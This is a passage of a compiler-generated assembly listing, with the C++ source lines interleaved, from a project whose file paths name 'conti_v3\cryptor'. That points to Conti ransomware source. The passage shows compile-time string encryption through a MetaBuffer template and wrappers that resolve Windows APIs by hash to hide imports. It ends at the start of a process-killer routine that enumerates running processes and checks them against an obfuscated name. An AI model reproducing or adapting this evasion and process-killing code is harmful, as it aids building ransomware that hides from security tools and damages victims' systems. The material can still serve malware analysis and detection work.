  002e9	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<19,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  002ee	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002f5	88 41 11	 mov	 BYTE PTR [rcx+17], al
  002f8	b8 01 00 00 00	 mov	 eax, 1
  002fd	48 6b c0 11	 imul	 rax, rax, 17
  00301	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00308	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0030c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00313	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<19,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00318	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0031f	88 41 12	 mov	 BYTE PTR [rcx+18], al
  00322	b8 01 00 00 00	 mov	 eax, 1
  00327	48 6b c0 12	 imul	 rax, rax, 18
  0032b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00332	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00336	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0033d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<19,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00342	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00349	88 41 13	 mov	 BYTE PTR [rcx+19], al
  0034c	b8 01 00 00 00	 mov	 eax, 1
  00351	48 6b c0 13	 imul	 rax, rax, 19
  00355	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0035c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00360	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00367	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<19,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  0036c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00373	88 41 14	 mov	 BYTE PTR [rcx+20], al
  00376	b8 01 00 00 00	 mov	 eax, 1
  0037b	48 6b c0 14	 imul	 rax, rax, 20
  0037f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00386	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0038a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00391	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<19,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00396	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0039d	88 41 15	 mov	 BYTE PTR [rcx+21], al
  003a0	b8 01 00 00 00	 mov	 eax, 1
  003a5	48 6b c0 15	 imul	 rax, rax, 21
  003a9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  003b0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  003b4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003bb	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<19,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  003c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003c7	88 41 16	 mov	 BYTE PTR [rcx+22], al
  003ca	b8 01 00 00 00	 mov	 eax, 1
  003cf	48 6b c0 16	 imul	 rax, rax, 22
  003d3	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  003da	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  003de	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003e5	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<19,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  003ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003f1	88 41 17	 mov	 BYTE PTR [rcx+23], al
  003f4	b8 01 00 00 00	 mov	 eax, 1
  003f9	48 6b c0 17	 imul	 rax, rax, 23
  003fd	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00404	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00408	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0040f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<19,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00414	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0041b	88 41 18	 mov	 BYTE PTR [rcx+24], al
  0041e	b8 01 00 00 00	 mov	 eax, 1
  00423	48 6b c0 18	 imul	 rax, rax, 24
  00427	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0042e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00432	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00439	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<19,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  0043e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00445	88 41 19	 mov	 BYTE PTR [rcx+25], al
  00448	b8 01 00 00 00	 mov	 eax, 1
  0044d	48 6b c0 19	 imul	 rax, rax, 25
  00451	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00458	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0045c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00463	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<19,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00468	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0046f	88 41 1a	 mov	 BYTE PTR [rcx+26], al
  00472	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00479	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  0047d	88 85 c0 00 00
	00		 mov	 BYTE PTR tv280[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  00483	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0048a	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  00491	5f		 pop	 rdi
  00492	5d		 pop	 rbp
  00493	c3		 ret	 0
??0?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<19,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::MetaBuffer<19,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?positive_modulo@@YAHHH@Z
_TEXT	SEGMENT
a$ = 224
n$ = 232
?positive_modulo@@YAHHH@Z PROC				; positive_modulo, COMDAT

; 39   : {

$LN3:
  00000	89 54 24 10	 mov	 DWORD PTR [rsp+16], edx
  00004	89 4c 24 08	 mov	 DWORD PTR [rsp+8], ecx
  00008	55		 push	 rbp
  00009	57		 push	 rdi
  0000a	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00011	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00016	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001d	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 40   :     return (a % n + n) % n;

  00022	8b 85 e0 00 00
	00		 mov	 eax, DWORD PTR a$[rbp]
  00028	99		 cdq
  00029	f7 bd e8 00 00
	00		 idiv	 DWORD PTR n$[rbp]
  0002f	8b c2		 mov	 eax, edx
  00031	03 85 e8 00 00
	00		 add	 eax, DWORD PTR n$[rbp]
  00037	99		 cdq
  00038	f7 bd e8 00 00
	00		 idiv	 DWORD PTR n$[rbp]
  0003e	8b c2		 mov	 eax, edx

; 41   : }

  00040	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00047	5f		 pop	 rdi
  00048	5d		 pop	 rbp
  00049	c3		 ret	 0
?positive_modulo@@YAHHH@Z ENDP				; positive_modulo
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pProcess32NextW@@YAHPEAXPEAUtagPROCESSENTRY32W@@@Z
_TEXT	SEGMENT
pFunction$ = 8
hSnapshot$ = 256
lppe$ = 264
?pProcess32NextW@@YAHPEAXPEAUtagPROCESSENTRY32W@@@Z PROC ; pProcess32NextW, COMDAT

; 1144 : {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 1145 : 	BOOL(WINAPI * pFunction)(HANDLE, LPPROCESSENTRY32W);
; 1146 : 	pFunction = (BOOL(WINAPI*)(HANDLE, LPPROCESSENTRY32W))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xc9a81ce0, 12);

  00024	41 b9 0c 00 00
	00		 mov	 r9d, 12
  0002a	41 b8 e0 1c a8
	c9		 mov	 r8d, -911729440		; c9a81ce0H
  00030	ba 0f 00 00 00	 mov	 edx, 15
  00035	33 c9		 xor	 ecx, ecx
  00037	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  0003c	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 1147 : 	return pFunction(hSnapshot, lppe);

  00040	48 8b 95 08 01
	00 00		 mov	 rdx, QWORD PTR lppe$[rbp]
  00047	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR hSnapshot$[rbp]
  0004e	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 1148 : }

  00051	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00058	5f		 pop	 rdi
  00059	5d		 pop	 rbp
  0005a	c3		 ret	 0
?pProcess32NextW@@YAHPEAXPEAUtagPROCESSENTRY32W@@@Z ENDP ; pProcess32NextW
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pProcess32FirstW@@YAHPEAXPEAUtagPROCESSENTRY32W@@@Z
_TEXT	SEGMENT
pFunction$ = 8
hSnapshot$ = 256
lppe$ = 264
?pProcess32FirstW@@YAHPEAXPEAUtagPROCESSENTRY32W@@@Z PROC ; pProcess32FirstW, COMDAT

; 1131 : {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 1132 : 	BOOL(WINAPI * pFunction)(HANDLE, LPPROCESSENTRY32W);
; 1133 : 	pFunction = (BOOL(WINAPI*)(HANDLE, LPPROCESSENTRY32W))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x5e57b014, 13);

  00024	41 b9 0d 00 00
	00		 mov	 r9d, 13
  0002a	41 b8 14 b0 57
	5e		 mov	 r8d, 1582805012		; 5e57b014H
  00030	ba 0f 00 00 00	 mov	 edx, 15
  00035	33 c9		 xor	 ecx, ecx
  00037	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  0003c	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 1134 : 	return pFunction(hSnapshot, lppe);

  00040	48 8b 95 08 01
	00 00		 mov	 rdx, QWORD PTR lppe$[rbp]
  00047	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR hSnapshot$[rbp]
  0004e	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 1135 : }

  00051	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00058	5f		 pop	 rdi
  00059	5d		 pop	 rbp
  0005a	c3		 ret	 0
?pProcess32FirstW@@YAHPEAXPEAUtagPROCESSENTRY32W@@@Z ENDP ; pProcess32FirstW
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pCreateToolhelp32Snapshot@@YAPEAXKK@Z
_TEXT	SEGMENT
pFunction$ = 8
dwFlags$ = 256
th32ProcessID$ = 264
?pCreateToolhelp32Snapshot@@YAPEAXKK@Z PROC		; pCreateToolhelp32Snapshot, COMDAT

; 1118 : {

$LN3:
  00000	89 54 24 10	 mov	 DWORD PTR [rsp+16], edx
  00004	89 4c 24 08	 mov	 DWORD PTR [rsp+8], ecx
  00008	55		 push	 rbp
  00009	57		 push	 rdi
  0000a	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00011	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00016	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  0001d	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 1119 : 	HANDLE(WINAPI * pFunction)(DWORD, DWORD);
; 1120 : 	pFunction = (HANDLE(WINAPI*)(DWORD, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xa86f8bb2, 14);

  00022	41 b9 0e 00 00
	00		 mov	 r9d, 14
  00028	41 b8 b2 8b 6f
	a8		 mov	 r8d, -1469084750	; a86f8bb2H
  0002e	ba 0f 00 00 00	 mov	 edx, 15
  00033	33 c9		 xor	 ecx, ecx
  00035	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  0003a	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 1121 : 	return pFunction(dwFlags, th32ProcessID);

  0003e	8b 95 08 01 00
	00		 mov	 edx, DWORD PTR th32ProcessID$[rbp]
  00044	8b 8d 00 01 00
	00		 mov	 ecx, DWORD PTR dwFlags$[rbp]
  0004a	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 1122 : }

  0004d	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00054	5f		 pop	 rdi
  00055	5d		 pop	 rbp
  00056	c3		 ret	 0
?pCreateToolhelp32Snapshot@@YAPEAXKK@Z ENDP		; pCreateToolhelp32Snapshot
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?plstrcmpiW@@YAHPEB_W0@Z
_TEXT	SEGMENT
pFunction$ = 8
lpString1$ = 256
lpString2$ = 264
?plstrcmpiW@@YAHPEB_W0@Z PROC				; plstrcmpiW, COMDAT

; 341  : {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 342  : 	int(WINAPI * pFunction)(LPCWSTR, LPCWSTR);
; 343  : 	pFunction = (INT(WINAPI*)(LPCWSTR, LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xcd7328ca, 81);//GetProcAddress(hKernel32, OBFA("lstrcmpiW"));

  00024	41 b9 51 00 00
	00		 mov	 r9d, 81			; 00000051H
  0002a	41 b8 ca 28 73
	cd		 mov	 r8d, -848090934		; cd7328caH
  00030	ba 0f 00 00 00	 mov	 edx, 15
  00035	33 c9		 xor	 ecx, ecx
  00037	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  0003c	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 344  : 	return pFunction(lpString1, lpString2);

  00040	48 8b 95 08 01
	00 00		 mov	 rdx, QWORD PTR lpString2$[rbp]
  00047	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR lpString1$[rbp]
  0004e	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 345  : }

  00051	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00058	5f		 pop	 rdi
  00059	5d		 pop	 rbp
  0005a	c3		 ret	 0
?plstrcmpiW@@YAHPEB_W0@Z ENDP				; plstrcmpiW
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pCloseHandle@@YAHPEAX@Z
_TEXT	SEGMENT
pFunction$ = 8
hObject$ = 256
?pCloseHandle@@YAHPEAX@Z PROC				; pCloseHandle, COMDAT

; 226  : {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 227  : 	BOOL(WINAPI * pFunction)(HANDLE);
; 228  : 	pFunction = (BOOL(WINAPI*)(HANDLE))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xca528872, 91);//GetProcAddress(hKernel32, OBFA("CloseHandle"));

  0001f	41 b9 5b 00 00
	00		 mov	 r9d, 91			; 0000005bH
  00025	41 b8 72 88 52
	ca		 mov	 r8d, -900560782		; ca528872H
  0002b	ba 0f 00 00 00	 mov	 edx, 15
  00030	33 c9		 xor	 ecx, ecx
  00032	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00037	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 229  : 	return pFunction(hObject);

  0003b	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR hObject$[rbp]
  00042	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 230  : }

  00045	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0004c	5f		 pop	 rdi
  0004d	5d		 pop	 rbp
  0004e	c3		 ret	 0
?pCloseHandle@@YAHPEAX@Z ENDP				; pCloseHandle
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\prockiller\prockiller.cpp
;	COMDAT ?GetWhiteListProcess@process_killer@@YAXPEAUPID_LIST@1@@Z
_TEXT	SEGMENT
hSnapShot$ = 8
pe32$ = 48
Pid$4 = 648
$T5 = 1064
__$ArrayPad$ = 1112
PidList$ = 1152
?GetWhiteListProcess@process_killer@@YAXPEAUPID_LIST@1@@Z PROC ; process_killer::GetWhiteListProcess, COMDAT

; 10   : {

$LN13:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 88 04
	00 00		 sub	 rsp, 1160		; 00000488H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 7c 24 20	 lea	 rdi, QWORD PTR [rsp+32]
  00018	b9 ba 00 00 00	 mov	 ecx, 186		; 000000baH
  0001d	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
  00022	f3 ab		 rep stosd
  00024	48 8b 8c 24 a8
	04 00 00	 mov	 rcx, QWORD PTR [rsp+1192]
  0002c	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  00033	48 33 c5	 xor	 rax, rbp
  00036	48 89 85 58 04
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp], rax
  0003d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__62043E23_prockiller@cpp
  00044	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 11   : 	HANDLE hSnapShot = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

  00049	33 d2		 xor	 edx, edx
  0004b	b9 02 00 00 00	 mov	 ecx, 2
  00050	e8 00 00 00 00	 call	 ?pCreateToolhelp32Snapshot@@YAPEAXKK@Z ; pCreateToolhelp32Snapshot
  00055	48 89 45 08	 mov	 QWORD PTR hSnapShot$[rbp], rax

; 12   : 	if (hSnapShot == NULL) {

  00059	48 83 7d 08 00	 cmp	 QWORD PTR hSnapShot$[rbp], 0
  0005e	75 05		 jne	 SHORT $LN8@GetWhiteLi

; 13   : 		return;

  00060	e9 ee 00 00 00	 jmp	 $LN1@GetWhiteLi
$LN8@GetWhiteLi:

; 14   : 	}
; 15   : 
; 16   : 	PROCESSENTRY32W pe32;
; 17   : 	pe32.dwSize = sizeof(PROCESSENTRY32W);

  00065	c7 45 30 38 02
	00 00		 mov	 DWORD PTR pe32$[rbp], 568 ; 00000238H

; 18   : 
; 19   : 	if (!pProcess32FirstW(hSnapShot, &pe32)) {

  0006c	48 8d 55 30	 lea	 rdx, QWORD PTR pe32$[rbp]
  00070	48 8b 4d 08	 mov	 rcx, QWORD PTR hSnapShot$[rbp]
  00074	e8 00 00 00 00	 call	 ?pProcess32FirstW@@YAHPEAXPEAUtagPROCESSENTRY32W@@@Z ; pProcess32FirstW
  00079	85 c0		 test	 eax, eax
  0007b	75 0e		 jne	 SHORT $LN9@GetWhiteLi

; 20   : 
; 21   : 		pCloseHandle(hSnapShot);

  0007d	48 8b 4d 08	 mov	 rcx, QWORD PTR hSnapShot$[rbp]
  00081	e8 00 00 00 00	 call	 ?pCloseHandle@@YAHPEAX@Z ; pCloseHandle

; 22   : 		return;

  00086	e9 c8 00 00 00	 jmp	 $LN1@GetWhiteLi
$LN9@GetWhiteLi:
$LN4@GetWhiteLi:

; 23   : 
; 24   : 	}
; 25   : 
; 26   : 	do
; 27   : 	{
; 28   : 
; 29   : 		if (!plstrcmpiW(pe32.szExeFile, OBFW(L"explorer.exe"))) {

  0008b	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_1BK@BPIGMGKF@?$AAe?$AAx?$AAp?$AAl?$AAo?$AAr?$AAe?$AAr?$AA?4?$AAe?$AAx?$AAe@
  00092	48 8d 8d 28 04
	00 00		 lea	 rcx, QWORD PTR $T5[rbp]
  00099	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z ; MetaBuffer<19,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::MetaBuffer<19,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >
  0009e	48 8b c8	 mov	 rcx, rax
  000a1	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ ; MetaBuffer<19,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt
  000a6	48 8b d0	 mov	 rdx, rax
  000a9	48 8d 4d 5c	 lea	 rcx, QWORD PTR pe32$[rbp+44]
  000ad	e8 00 00 00 00	 call	 ?plstrcmpiW@@YAHPEB_W0@Z ; plstrcmpiW
  000b2	85 c0		 test	 eax, eax
